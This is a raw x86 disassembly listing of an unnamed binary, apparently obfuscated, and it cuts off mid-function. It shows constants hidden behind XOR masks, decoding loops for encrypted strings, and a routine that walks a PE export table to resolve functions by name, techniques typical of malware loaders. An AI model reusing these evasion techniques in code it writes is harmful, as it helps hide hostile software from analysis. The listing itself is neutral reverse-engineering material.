  42752e:	mov    ecx,DWORD PTR [ebp-0x4]
  427531:	jbe    0x427545
  427533:	add    ecx,DWORD PTR [ebp+0x8]
  427536:	mov    edx,DWORD PTR [ebp-0x4]
  427539:	add    edx,DWORD PTR [ebp+0xc]
  42753c:	mov    edx,DWORD PTR [edx]
  42753e:	mov    DWORD PTR [ecx],edx
  427540:	mov    ecx,DWORD PTR [ebp-0x10]
  427543:	jmp    0x42756a
  427545:	mov    edx,DWORD PTR [ebp+0x10]
  427548:	sub    edx,ecx
  42754a:	mov    ecx,DWORD PTR [ebp-0x14]
  42754d:	xor    ecx,eax
  42754f:	add    ecx,esi
  427551:	cmp    edx,ecx
  427553:	mov    ecx,DWORD PTR [ebp-0x4]
  427556:	jbe    0x42757b
  427558:	add    ecx,DWORD PTR [ebp+0x8]
  42755b:	mov    edx,DWORD PTR [ebp-0x4]
  42755e:	add    edx,DWORD PTR [ebp+0xc]
  427561:	mov    dx,WORD PTR [edx]
  427564:	mov    WORD PTR [ecx],dx
  427567:	mov    ecx,DWORD PTR [ebp-0x14]
  42756a:	mov    edx,DWORD PTR [ebp-0x4]
  42756d:	xor    ecx,eax
  42756f:	lea    ecx,[ecx+edx*1+0x3272ec]
  427576:	mov    DWORD PTR [ebp-0x4],ecx
  427579:	jmp    0x42758b
  42757b:	add    ecx,DWORD PTR [ebp+0x8]
  42757e:	mov    edx,DWORD PTR [ebp-0x4]
  427581:	add    edx,DWORD PTR [ebp+0xc]
  427584:	mov    dl,BYTE PTR [edx]
  427586:	mov    BYTE PTR [ecx],dl
  427588:	inc    DWORD PTR [ebp-0x4]
  42758b:	mov    ecx,DWORD PTR [ebp-0x18]
  42758e:	mov    edx,DWORD PTR [ebp+0x10]
  427591:	xor    ecx,eax
  427593:	add    ecx,esi
  427595:	imul   ecx,edx
  427598:	mov    edx,DWORD PTR [ebp-0x8]
  42759b:	mov    edi,DWORD PTR [ebp-0x4]
  42759e:	xor    edx,eax
  4275a0:	lea    edx,[edx+edi*1+0x3272ec]
  4275a7:	cmp    edx,ecx
  4275a9:	jb     0x4274ef
  4275af:	pop    edi
  4275b0:	pop    esi
  4275b1:	leave  
  4275b2:	ret    0xc
  4275b5:	push   ebp
  4275b6:	mov    ebp,esp
  4275b8:	sub    esp,0xc
  4275bb:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4275c2:	push   esi
  4275c3:	mov    esi,eax
  4275c5:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4275cc:	mov    edx,DWORD PTR [ebp-0x4]
  4275cf:	mov    eax,0x75108a4
  4275d4:	xor    edx,eax
  4275d6:	mov    ecx,0x3272ec
  4275db:	add    edx,ecx
  4275dd:	cmp    esi,edx
  4275df:	je     0x427621
  4275e1:	push   ebx
  4275e2:	push   edi
  4275e3:	mov    edx,DWORD PTR [ebp-0x8]
  4275e6:	mov    ebx,DWORD PTR [ebp+0x8]
  4275e9:	xor    edx,eax
  4275eb:	mov    edi,0xffcd8d14
  4275f0:	sub    edi,edx
  4275f2:	add    esi,edi
  4275f4:	lea    edx,[esi-0x3272ec]
  4275fa:	xor    edx,eax
  4275fc:	mov    DWORD PTR [ebp-0xc],edx
  4275ff:	mov    edx,DWORD PTR [ebp-0x4]
  427602:	mov    edi,DWORD PTR [ebp-0xc]
  427605:	xor    dl,0xa4
  427608:	sub    dl,0x14
  42760b:	xor    edi,eax
  42760d:	mov    BYTE PTR [edi+ebx*1+0x3272ec],dl
  427614:	mov    edx,DWORD PTR [ebp-0x4]
  427617:	xor    edx,eax
  427619:	add    edx,ecx
  42761b:	cmp    esi,edx
  42761d:	jne    0x4275e3
  42761f:	pop    edi
  427620:	pop    ebx
  427621:	pop    esi
  427622:	leave  
  427623:	ret    0x4
  427626:	push   ebp
  427627:	mov    ebp,esp
  427629:	sub    esp,0x21c
  42762f:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  427636:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  42763d:	mov    eax,DWORD PTR [ebp+0x10]
  427640:	mov    eax,DWORD PTR [ebp-0x4]
  427643:	mov    ecx,DWORD PTR [ebp+0x8]
  427646:	push   esi
  427647:	push   edi
  427648:	mov    edi,0x75108a4
  42764d:	xor    eax,edi
  42764f:	mov    esi,0x3272ec
  427654:	add    eax,esi
  427656:	cmp    eax,ecx
  427658:	mov    eax,DWORD PTR [ebp-0x4]
  42765b:	jne    0x427666
  42765d:	xor    eax,edi
  42765f:	add    eax,esi
  427661:	jmp    0x427712
  427666:	mov    ecx,DWORD PTR [ebp+0xc]
  427669:	xor    eax,edi
  42766b:	add    eax,esi
  42766d:	cmp    eax,ecx
  42766f:	jne    0x427676
  427671:	mov    eax,DWORD PTR [ebp-0x4]
  427674:	jmp    0x42765d
  427676:	lea    eax,[ebp-0x21c]
  42767c:	mov    DWORD PTR [ebp-0x8],eax
  42767f:	mov    eax,DWORD PTR [ebp+0xc]
  427682:	mov    DWORD PTR [ebp-0x10],eax
  427685:	mov    eax,DWORD PTR [ebp-0x4]
  427688:	xor    eax,edi
  42768a:	add    eax,esi
  42768c:	mov    DWORD PTR [ebp+0x10],eax
  42768f:	mov    eax,DWORD PTR [ebp+0xc]
  427692:	push   ebx
  427693:	call   0x4273bd
  427698:	mov    ebx,eax
  42769a:	mov    eax,DWORD PTR [ebp+0x8]
  42769d:	mov    eax,DWORD PTR [eax+0x14]
  4276a0:	jmp    0x4276fa
  4276a2:	mov    eax,DWORD PTR [ebp+0xc]
  4276a5:	sub    eax,0x8
  4276a8:	mov    DWORD PTR [ebp-0xc],eax
  4276ab:	mov    eax,DWORD PTR [ebp-0xc]
  4276ae:	mov    eax,DWORD PTR [eax+0x28]
  4276b1:	call   0x4272a5
  4276b6:	mov    DWORD PTR [ebp+0x10],eax
  4276b9:	push   DWORD PTR [ebp+0x10]
  4276bc:	mov    edx,DWORD PTR [ebp-0x8]
  4276bf:	call   0x42744c
  4276c4:	mov    eax,DWORD PTR [ebp-0x4]
  4276c7:	xor    eax,edi
  4276c9:	add    eax,esi
  4276cb:	cmp    eax,ebx
  4276cd:	jne    0x4276d7
  4276cf:	mov    eax,DWORD PTR [ebp-0x8]
  4276d2:	call   0x427333
  4276d7:	mov    eax,DWORD PTR [ebp-0x14]
  4276da:	xor    eax,edi
  4276dc:	add    eax,esi
  4276de:	push   eax
  4276df:	push   DWORD PTR [ebp-0x10]
  4276e2:	mov    eax,DWORD PTR [ebp-0x8]
  4276e5:	call   0x42705f
  4276ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4276ed:	xor    ecx,edi
  4276ef:	add    ecx,esi
  4276f1:	cmp    eax,ecx
  4276f3:	je     0x427718
  4276f5:	mov    eax,DWORD PTR [ebp+0xc]
  4276f8:	mov    eax,DWORD PTR [eax]
  4276fa:	mov    DWORD PTR [ebp+0xc],eax
  4276fd:	mov    eax,DWORD PTR [ebp+0x8]
  427700:	mov    ecx,DWORD PTR [ebp+0xc]
  427703:	add    eax,0x14
  427706:	cmp    ecx,eax
  427708:	jne    0x4276a2
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	xor    eax,edi
  42770f:	add    eax,esi
  427711:	pop    ebx
  427712:	pop    edi
  427713:	pop    esi
  427714:	leave  
  427715:	ret    0xc
  427718:	mov    eax,DWORD PTR [ebp-0xc]
  42771b:	mov    eax,DWORD PTR [eax+0x18]
  42771e:	jmp    0x427711
  427720:	push   ebp
  427721:	mov    ebp,esp
  427723:	mov    eax,DWORD PTR [ebp+0xc]
  427726:	sub    esp,0x10
  427729:	cmp    DWORD PTR [ebp+0x8],0x0
  42772d:	push   ebx
  42772e:	push   esi
  42772f:	push   edi
  427730:	je     0x4277e5
  427736:	test   eax,eax
  427738:	je     0x4277e5
  42773e:	movzx  eax,WORD PTR [eax+0x20]
  427742:	mov    ecx,eax
  427744:	mov    DWORD PTR [ebp-0x10],eax
  427747:	xor    edx,edx
  427749:	and    DWORD PTR [ebp-0x8],edx
  42774c:	mov    eax,0x8a94
  427751:	xor    ecx,eax
  427753:	add    ecx,0x3b56
  427759:	mov    DWORD PTR [ebp-0xc],ecx
  42775c:	and    DWORD PTR [ebp-0x4],0x0
  427760:	xor    ecx,ecx
  427762:	push   0x7c
  427764:	pop    edi
  427765:	cmp    cx,WORD PTR [ebp-0xc]
  427769:	jae    0x4277cf
  42776b:	lea    esi,[edx-0x3b56]
  427771:	xor    esi,eax
  427773:	movzx  ecx,WORD PTR [ebp-0x4]
  427777:	mov    ebx,DWORD PTR [ebp+0xc]
  42777a:	lea    ecx,[ebx+ecx*4]
  42777d:	cmp    WORD PTR [ecx+0x2],si
  427781:	jne    0x4277ba
  427783:	movzx  ecx,WORD PTR [ecx]
  427786:	mov    edi,0x4e3e
  42778b:	cmp    cx,di
  42778e:	jne    0x42779c
  427790:	mov    ebx,DWORD PTR [ebp+0x8]
  427793:	movzx  edi,dx
  427796:	cmp    BYTE PTR [edi+ebx*1],0x0
  42779a:	je     0x4277c9
  42779c:	mov    ebx,DWORD PTR [ebp+0x8]
  42779f:	movzx  edi,dx
  4277a2:	movsx  di,BYTE PTR [edi+ebx*1]
  4277a7:	mov    ebx,0x3b56
  4277ac:	sub    di,bx
  4277af:	xor    di,ax
  4277b2:	cmp    cx,di
  4277b5:	je     0x4277c9
  4277b7:	push   0x7a
  4277b9:	pop    edi
  4277ba:	inc    DWORD PTR [ebp-0x4]
  4277bd:	mov    cx,WORD PTR [ebp-0xc]
  4277c1:	cmp    WORD PTR [ebp-0x4],cx
  4277c5:	jb     0x427773
  4277c7:	jmp    0x4277cf
  4277c9:	inc    DWORD PTR [ebp-0x8]
  4277cc:	push   0x7d
  4277ce:	pop    edi
  4277cf:	mov    esi,DWORD PTR [ebp+0x8]
  4277d2:	movzx  ecx,dx
  4277d5:	cmp    BYTE PTR [ecx+esi*1],0x0
  4277d9:	je     0x4277ee
  4277db:	inc    edx
  4277dc:	cmp    edi,0x7a
  4277df:	jne    0x42775c
  4277e5:	xor    eax,eax
  4277e7:	pop    edi
  4277e8:	pop    esi
  4277e9:	pop    ebx
  4277ea:	leave  
  4277eb:	ret    0x8
  4277ee:	mov    ecx,DWORD PTR [ebp-0x8]
  4277f1:	add    ecx,0xffffc4aa
  4277f7:	xor    cx,ax
  4277fa:	xor    eax,eax
  4277fc:	cmp    cx,WORD PTR [ebp-0x10]
  427800:	sete   al
  427803:	jmp    0x4277e7
  427805:	push   ebp
  427806:	mov    ebp,esp
  427808:	sub    esp,0x50
  42780b:	push   edi
  42780c:	mov    edi,eax
  42780e:	mov    eax,DWORD PTR [edi+0x1a8]
  427814:	cmp    DWORD PTR [eax],0x0
  427817:	jne    0x427820
  427819:	xor    eax,eax
  42781b:	jmp    0x427951
  427820:	push   DWORD PTR [ebp+0x8]
  427823:	push   0x2c
  427825:	pop    eax
  427826:	call   0x4275b5
  42782b:	mov    edx,DWORD PTR [edi+0x1ac]
  427831:	lea    eax,[edi+0x22]
  427834:	mov    DWORD PTR [ebp-0x4c],eax
  427837:	lea    eax,[edi+0x44]
  42783a:	mov    DWORD PTR [ebp-0x48],eax
  42783d:	lea    eax,[edi+0x66]
  427840:	mov    DWORD PTR [ebp-0x44],eax
  427843:	lea    eax,[edi+0x88]
  427849:	mov    DWORD PTR [ebp-0x40],eax
  42784c:	lea    eax,[edi+0xaa]
  427852:	mov    DWORD PTR [ebp-0x3c],eax
  427855:	lea    eax,[edi+0xcc]
  42785b:	mov    DWORD PTR [ebp-0x38],eax
  42785e:	lea    eax,[edi+0xee]
  427864:	mov    DWORD PTR [ebp-0x34],eax
  427867:	lea    eax,[edi+0x110]
  42786d:	mov    DWORD PTR [ebp-0x30],eax
  427870:	lea    eax,[edi+0x132]
  427876:	mov    DWORD PTR [ebp-0x2c],eax
  427879:	lea    eax,[edi+0x154]
  42787f:	push   edi
  427880:	mov    DWORD PTR [ebp-0x50],edi
  427883:	mov    DWORD PTR [ebp-0x28],eax
  427886:	call   0x427985
  42788b:	push   eax
  42788c:	mov    eax,DWORD PTR [edi+0x1a8]
  427892:	push   DWORD PTR [eax]
  427894:	call   0x427626
  427899:	mov    DWORD PTR [ebp-0x10],eax
  42789c:	test   eax,eax
  42789e:	je     0x427951
  4278a4:	mov    ecx,DWORD PTR [eax+0x3c]
  4278a7:	push   ebx
  4278a8:	push   esi
  4278a9:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4278ad:	add    esi,eax
  4278af:	mov    edi,DWORD PTR [esi+0x24]
  4278b2:	mov    ecx,DWORD PTR [esi+0x1c]
  4278b5:	mov    edx,DWORD PTR [esi+0x20]
  4278b8:	mov    ebx,DWORD PTR [esi+0x18]
  4278bb:	add    edi,eax
  4278bd:	mov    DWORD PTR [ebp-0x20],edi
  4278c0:	mov    edi,DWORD PTR [esi+0x14]
  4278c3:	add    ecx,eax
  4278c5:	add    edx,eax
  4278c7:	mov    DWORD PTR [ebp-0xc],ecx
  4278ca:	mov    DWORD PTR [ebp-0x1c],edx
  4278cd:	mov    DWORD PTR [ebp-0x8],edi
  4278d0:	cmp    edi,ebx
  4278d2:	ja     0x4278d7
  4278d4:	mov    DWORD PTR [ebp-0x8],ebx
  4278d7:	xor    ebx,ebx
  4278d9:	mov    DWORD PTR [ebp-0x18],ebx
  4278dc:	cmp    DWORD PTR [ebp-0x8],ebx
  4278df:	jbe    0x42794f
  4278e1:	jmp    0x4278e6
  4278e3:	mov    edx,DWORD PTR [ebp-0x1c]
  4278e6:	mov    edi,DWORD PTR [ebp-0x20]
  4278e9:	movzx  edi,WORD PTR [edi+ebx*2]
  4278ed:	cmp    ebx,DWORD PTR [esi+0x18]
  4278f0:	jae    0x42794f
  4278f2:	cmp    edi,DWORD PTR [esi+0x14]
  4278f5:	jae    0x42794f
  4278f7:	mov    ebx,DWORD PTR [edx+ebx*4]
  4278fa:	mov    edx,DWORD PTR [ebp+0x8]
  4278fd:	mov    edi,DWORD PTR [ecx+edi*4]
  427900:	mov    DWORD PTR [ebp-0x4],edx
  427903:	lea    edx,[ebp-0x50]
  427906:	add    ebx,eax
  427908:	add    edi,eax
  42790a:	sub    edx,DWORD PTR [ebp+0x8]
  42790d:	mov    DWORD PTR [ebp-0x14],0xb
  427914:	mov    DWORD PTR [ebp-0x24],edx
  427917:	mov    edx,DWORD PTR [ebp-0x4]
  42791a:	cmp    DWORD PTR [edx],0x0
  42791d:	jne    0x42793a
  42791f:	mov    eax,DWORD PTR [ebp-0x24]
  427922:	push   DWORD PTR [eax+edx*1]
  427925:	push   ebx
  427926:	call   0x427720
  42792b:	mov    ecx,DWORD PTR [ebp-0xc]
  42792e:	test   eax,eax
  427930:	je     0x427937
  427932:	mov    eax,DWORD PTR [ebp-0x4]
  427935:	mov    DWORD PTR [eax],edi
  427937:	mov    eax,DWORD PTR [ebp-0x10]
  42793a:	add    DWORD PTR [ebp-0x4],0x4
  42793e:	dec    DWORD PTR [ebp-0x14]
  427941:	jne    0x427917
  427943:	mov    ebx,DWORD PTR [ebp-0x18]
  427946:	inc    ebx
  427947:	mov    DWORD PTR [ebp-0x18],ebx
  42794a:	cmp    ebx,DWORD PTR [ebp-0x8]
  42794d:	jb     0x4278e3
  42794f:	pop    esi
  427950:	pop    ebx
  427951:	pop    edi
  427952:	leave  
  427953:	ret    0x4
  427956:	push   ebp
  427957:	mov    ebp,esp
  427959:	mov    eax,DWORD PTR [ebp+0x8]
  42795c:	push   esi
  42795d:	push   DWORD PTR [eax+0x1d8]
  427963:	lea    esi,[eax+0x198]
  427969:	mov    eax,DWORD PTR [ebp+0x8]
  42796c:	call   0x427805
  427971:	mov    ecx,DWORD PTR [esi]
  427973:	mov    DWORD PTR [ecx],eax
  427975:	mov    eax,DWORD PTR [esi]
  427977:	xor    ecx,ecx
  427979:	cmp    DWORD PTR [eax],ecx
  42797b:	pop    esi
  42797c:	setne  cl
  42797f:	mov    eax,ecx
  427981:	pop    ebp
  427982:	ret    0x4
  427985:	mov    ecx,DWORD PTR [edi+0x188]
  42798b:	push   ebx
  42798c:	jmp    0x4279a1
  42798e:	xor    eax,0x8a94
  427993:	add    eax,0x3b56
  427998:	mov    WORD PTR [ecx],ax
  42799b:	add    ecx,0x2
  42799e:	add    edx,0x2
  4279a1:	movzx  eax,WORD PTR [edx]
  4279a4:	mov    ebx,0x4e3e
  4279a9:	cmp    ax,bx
  4279ac:	jne    0x42798e
  4279ae:	xor    eax,eax
  4279b0:	mov    WORD PTR [ecx],ax
  4279b3:	mov    eax,DWORD PTR [edi+0x188]
  4279b9:	pop    ebx
  4279ba:	ret    
  4279bb:	push   edi
  4279bc:	mov    edi,eax
  4279be:	mov    eax,DWORD PTR [esi+0x188]
  4279c4:	shl    edi,0x6
  4279c7:	add    eax,edi
  4279c9:	jmp    0x4279d5
  4279cb:	xor    cl,0x79
  4279ce:	sub    cl,0x3
  4279d1:	mov    BYTE PTR [eax],cl
  4279d3:	inc    eax
  4279d4:	inc    edx
  4279d5:	mov    cl,BYTE PTR [edx]
  4279d7:	cmp    cl,0x7a
  4279da:	jne    0x4279cb
  4279dc:	mov    BYTE PTR [eax],0x0
  4279df:	mov    eax,DWORD PTR [esi+0x188]
  4279e5:	add    eax,edi
  4279e7:	pop    edi
  4279e8:	ret    
  4279e9:	push   ebp
  4279ea:	mov    ebp,esp
  4279ec:	sub    esp,0x14
  4279ef:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  4279f6:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  4279fd:	mov    eax,DWORD PTR [ebx]
  4279ff:	mov    DWORD PTR [ebp-0x8],eax
  427a02:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427a09:	push   esi
  427a0a:	push   edi
  427a0b:	mov    DWORD PTR [ebp-0x14],0xead71890
  427a12:	mov    edi,DWORD PTR [ebp-0x4]
  427a15:	mov    ecx,DWORD PTR [ebp-0x10]
  427a18:	mov    eax,0x75108a4
  427a1d:	xor    edi,eax
  427a1f:	mov    edx,0x3272ec
  427a24:	xor    ecx,eax
  427a26:	add    edi,edx
  427a28:	add    ecx,edx
  427a2a:	imul   edi,ecx
  427a2d:	jmp    0x427a75
  427a2f:	mov    ecx,DWORD PTR [ebp-0x8]
  427a32:	mov    esi,DWORD PTR [ebp-0x4]
  427a35:	xor    ecx,eax
  427a37:	xor    esi,eax
  427a39:	add    ecx,edx
  427a3b:	add    esi,edx
  427a3d:	test   esi,ecx
  427a3f:	mov    esi,DWORD PTR [ebp-0x8]
  427a42:	mov    ecx,DWORD PTR [ebp-0x4]
  427a45:	je     0x427a5c
  427a47:	xor    ecx,eax
  427a49:	xor    esi,eax
  427a4b:	add    ecx,edx
  427a4d:	add    esi,edx
  427a4f:	shr    esi,cl
  427a51:	mov    ecx,DWORD PTR [ebp-0x14]
  427a54:	xor    ecx,eax
  427a56:	add    ecx,edx
  427a58:	xor    esi,ecx
  427a5a:	jmp    0x427a66
  427a5c:	xor    esi,eax
  427a5e:	xor    ecx,eax
  427a60:	add    esi,edx
  427a62:	add    ecx,edx
  427a64:	shr    esi,cl
  427a66:	mov    DWORD PTR [ebp-0x8],esi
  427a69:	mov    ecx,DWORD PTR [ebp-0x4]
  427a6c:	xor    ecx,eax
  427a6e:	lea    edi,[edi+ecx*1+0x3272ec]
  427a75:	mov    ecx,DWORD PTR [ebp-0xc]
  427a78:	mov    esi,DWORD PTR [ebp-0x4]
  427a7b:	xor    esi,eax
  427a7d:	xor    ecx,eax
  427a7f:	sub    ecx,esi
  427a81:	cmp    edi,ecx
  427a83:	jbe    0x427a2f
  427a85:	mov    eax,DWORD PTR [ebp-0x8]
  427a88:	pop    edi
  427a89:	mov    DWORD PTR [ebx],eax
  427a8b:	mov    eax,DWORD PTR [ebp-0x8]
  427a8e:	pop    esi
  427a8f:	leave  
  427a90:	ret    
  427a91:	push   ebp
  427a92:	mov    ebp,esp
  427a94:	sub    esp,0x38
  427a97:	push   ebx
  427a98:	mov    ebx,0xf89c85b0
  427a9d:	mov    DWORD PTR [ebp-0x4],ebx
  427aa0:	lea    eax,[ebx+0x1]
  427aa3:	push   esi
  427aa4:	mov    DWORD PTR [ebp-0x24],eax
  427aa7:	mov    ecx,DWORD PTR [ebp-0x4]
  427aaa:	mov    edx,DWORD PTR [ebp+0x8]
  427aad:	mov    esi,0x75108a4
  427ab2:	push   edi
  427ab3:	xor    ecx,esi
  427ab5:	mov    edi,0x3272ec
  427aba:	add    ecx,edi
  427abc:	cmp    edx,ecx
  427abe:	je     0x427c24
  427ac4:	mov    ecx,DWORD PTR [ebp-0x4]
  427ac7:	mov    edx,DWORD PTR [ebp+0xc]
  427aca:	xor    ecx,esi
  427acc:	add    ecx,edi
  427ace:	cmp    edx,ecx
  427ad0:	je     0x427c24
  427ad6:	mov    ecx,DWORD PTR [ebp+0x10]
  427ad9:	mov    DWORD PTR [ebp-0x14],ecx
  427adc:	mov    ecx,DWORD PTR [ebp+0xc]
  427adf:	mov    edx,DWORD PTR [ebp+0x8]
  427ae2:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  427ae9:	mov    DWORD PTR [ebp-0x1c],eax
  427aec:	mov    DWORD PTR [ebp-0x10],ebx
  427aef:	mov    DWORD PTR [ebp+0xc],eax
  427af2:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  427af9:	mov    eax,DWORD PTR [ebp+0xc]
  427afc:	xor    eax,esi
  427afe:	mov    DWORD PTR [ebp-0x20],ecx
  427b01:	sub    ecx,eax
  427b03:	sub    ecx,edi
  427b05:	mov    DWORD PTR [ebp+0x8],ecx
  427b08:	mov    DWORD PTR [ebp-0xc],edx
  427b0b:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  427b12:	jmp    0x427c14
  427b17:	mov    eax,DWORD PTR [ebp+0xc]
  427b1a:	mov    ecx,DWORD PTR [ebp+0xc]
  427b1d:	xor    eax,esi
  427b1f:	xor    ecx,esi
  427b21:	lea    ecx,[eax+ecx*1+0x64e5d8]
  427b28:	mov    eax,DWORD PTR [ebp+0x8]
  427b2b:	xor    edx,edx
  427b2d:	div    ecx
  427b2f:	mov    eax,DWORD PTR [ebp+0x10]
  427b32:	mov    ecx,DWORD PTR [ebp+0xc]
  427b35:	xor    eax,esi
  427b37:	xor    ecx,esi
  427b39:	sub    eax,ecx
  427b3b:	cmp    edx,eax
  427b3d:	jne    0x427bd3
  427b43:	mov    eax,DWORD PTR [ebp+0x8]
  427b46:	mov    ecx,DWORD PTR [ebp-0xc]
  427b49:	mov    dl,BYTE PTR [eax+ecx*1]
  427b4c:	mov    eax,DWORD PTR [ebp-0x10]
  427b4f:	mov    ecx,DWORD PTR [ebp-0x8]
  427b52:	xor    eax,esi
  427b54:	xor    ecx,esi
  427b56:	add    eax,edi
  427b58:	add    ecx,edi
  427b5a:	cmp    eax,ecx
  427b5c:	jae    0x427ba4
  427b5e:	lea    ecx,[eax-0x3272ec]
  427b64:	mov    DWORD PTR [ebp-0x4],ecx
  427b67:	mov    ebx,DWORD PTR [ebp-0x4]
  427b6a:	xor    ebx,esi
  427b6c:	add    ebx,0x7f55d8f2
  427b72:	lea    ecx,[ebp+eax*4-0x38]
  427b76:	mov    DWORD PTR [ecx],ebx
  427b78:	mov    ebx,DWORD PTR [ecx]
  427b7a:	cmp    ebx,0x244ecb93
  427b80:	jbe    0x427b8a
  427b82:	add    DWORD PTR [ecx],0x405fcdc
  427b88:	jmp    0x427b90
  427b8a:	add    DWORD PTR [ecx],0xfdaf4324
  427b90:	mov    ecx,DWORD PTR [ebp-0x8]
  427b93:	xor    ecx,esi
  427b95:	inc    eax
  427b96:	inc    DWORD PTR [ebp-0x4]
  427b99:	add    ecx,edi
  427b9b:	cmp    eax,ecx
  427b9d:	jb     0x427b67
  427b9f:	mov    ebx,0xf89c85b0
  427ba4:	cmp    DWORD PTR [ebp-0x14],0x0
  427ba8:	jne    0x427bb2
  427baa:	xor    dl,0x79
  427bad:	sub    dl,0x3
  427bb0:	jmp    0x427bc8
  427bb2:	mov    eax,DWORD PTR [ebp-0x18]
  427bb5:	xor    al,0xa4
  427bb7:	mov    cl,0x14
  427bb9:	sub    cl,al
  427bbb:	add    dl,cl
  427bbd:	mov    ecx,DWORD PTR [ebp-0x1c]
  427bc0:	xor    cl,0xa4
  427bc3:	sub    cl,0x14
  427bc6:	ror    dl,cl
  427bc8:	xor    eax,eax
  427bca:	mov    eax,DWORD PTR [ebp+0x8]
  427bcd:	mov    ecx,DWORD PTR [ebp-0xc]
  427bd0:	mov    BYTE PTR [eax+ecx*1],dl
  427bd3:	mov    eax,DWORD PTR [ebp+0x8]
  427bd6:	mov    ecx,DWORD PTR [ebp-0x10]
  427bd9:	sub    eax,edi
  427bdb:	xor    eax,esi
  427bdd:	cmp    eax,ecx
  427bdf:	jne    0x427c02
  427be1:	mov    eax,DWORD PTR [ebp+0x10]
  427be4:	mov    ecx,DWORD PTR [ebp+0xc]
  427be7:	xor    eax,esi
  427be9:	xor    ecx,esi
  427beb:	sub    eax,ecx
  427bed:	mov    ecx,DWORD PTR [ebp-0x20]
  427bf0:	sub    eax,edi
  427bf2:	xor    eax,esi
  427bf4:	mov    DWORD PTR [ebp+0x10],eax
  427bf7:	mov    eax,DWORD PTR [ebp+0xc]
  427bfa:	xor    eax,esi
  427bfc:	sub    ecx,eax
  427bfe:	sub    ecx,edi
  427c00:	jmp    0x427c11
  427c02:	mov    eax,DWORD PTR [ebp+0xc]
  427c05:	xor    eax,esi
  427c07:	mov    ecx,0xffcd8d14
  427c0c:	sub    ecx,eax
  427c0e:	add    ecx,DWORD PTR [ebp+0x8]
  427c11:	mov    DWORD PTR [ebp+0x8],ecx
  427c14:	mov    eax,DWORD PTR [ebp+0x10]
  427c17:	cmp    eax,ebx
  427c19:	jne    0x427b17
  427c1f:	mov    eax,DWORD PTR [ebp-0x24]
  427c22:	jmp    0x427c27
  427c24:	mov    eax,DWORD PTR [ebp-0x4]
  427c27:	xor    eax,esi
  427c29:	add    eax,edi
  427c2b:	pop    edi
  427c2c:	pop    esi
  427c2d:	pop    ebx
  427c2e:	leave  
  427c2f:	ret    0xc
  427c32:	push   ebp
  427c33:	mov    ebp,esp
  427c35:	sub    esp,0x420
  427c3b:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  427c42:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  427c49:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  427c50:	push   ebx
  427c51:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  427c58:	mov    eax,DWORD PTR [ebp-0x14]
  427c5b:	push   esi
  427c5c:	mov    esi,0x75108a4
  427c61:	push   edi
  427c62:	xor    eax,esi
  427c64:	mov    edi,0x3272ec
  427c69:	add    eax,edi
  427c6b:	mov    DWORD PTR [ebp-0x8],eax
  427c6e:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  427c75:	mov    DWORD PTR [ebp-0x4],0xead71890
  427c7c:	mov    DWORD PTR [ebp-0x10],0x8
  427c83:	mov    ecx,ecx
  427c85:	mov    eax,DWORD PTR [ebp-0xc]
  427c88:	mov    ecx,DWORD PTR [ebp-0x14]
  427c8b:	xor    eax,esi
  427c8d:	xor    ecx,esi
  427c8f:	add    eax,edi
  427c91:	add    ecx,edi
  427c93:	imul   eax,ecx
  427c96:	jmp    0x427cc9
  427c98:	mov    eax,DWORD PTR [ebp-0x4]
  427c9b:	sub    eax,edi
  427c9d:	xor    eax,esi
  427c9f:	mov    DWORD PTR [ebp-0x8],eax
  427ca2:	lea    ebx,[ebp-0x8]
  427ca5:	call   0x4279e9
  427caa:	mov    DWORD PTR [ebp-0x8],eax
  427cad:	mov    eax,DWORD PTR [ebp-0x8]
  427cb0:	mov    ecx,DWORD PTR [ebp-0x4]
  427cb3:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  427cba:	mov    eax,DWORD PTR [ebp-0xc]
  427cbd:	mov    ecx,DWORD PTR [ebp-0x4]
  427cc0:	xor    eax,esi
  427cc2:	lea    eax,[eax+ecx*1+0x3272ec]
  427cc9:	mov    DWORD PTR [ebp-0x4],eax
  427ccc:	mov    eax,DWORD PTR [ebp-0x18]
  427ccf:	mov    ecx,DWORD PTR [ebp-0xc]
  427cd2:	xor    ecx,esi
  427cd4:	xor    eax,esi
  427cd6:	sub    eax,ecx
  427cd8:	mov    ecx,DWORD PTR [ebp-0x4]
  427cdb:	cmp    ecx,eax
  427cdd:	jbe    0x427c98
  427cdf:	mov    eax,DWORD PTR [ebp-0x1c]
  427ce2:	xor    eax,esi
  427ce4:	add    eax,edi
  427ce6:	mov    DWORD PTR [ebp-0x8],eax
  427ce9:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  427cf0:	mov    ebx,ebx
  427cf2:	jmp    0x427d55
  427cf4:	mov    ecx,DWORD PTR [ebp-0x20]
  427cf7:	mov    eax,DWORD PTR [ebp-0x8]
  427cfa:	xor    ecx,esi
  427cfc:	add    ecx,edi
  427cfe:	shr    eax,cl
  427d00:	mov    DWORD PTR [ebp-0x4],eax
  427d03:	mov    eax,DWORD PTR [ebp+0x8]
  427d06:	mov    cl,BYTE PTR [eax]
  427d08:	mov    BYTE PTR [ebp+0xb],cl
  427d0b:	mov    cl,BYTE PTR [ebp+0xb]
  427d0e:	mov    edx,DWORD PTR [ebp-0x8]
  427d11:	movzx  ecx,cl
  427d14:	xor    ecx,edx
  427d16:	mov    DWORD PTR [ebp+0x8],ecx
  427d19:	mov    ecx,DWORD PTR [ebp-0x18]
  427d1c:	mov    edx,DWORD PTR [ebp+0x8]
  427d1f:	xor    ecx,esi
  427d21:	add    ecx,edi
  427d23:	and    ecx,edx
  427d25:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
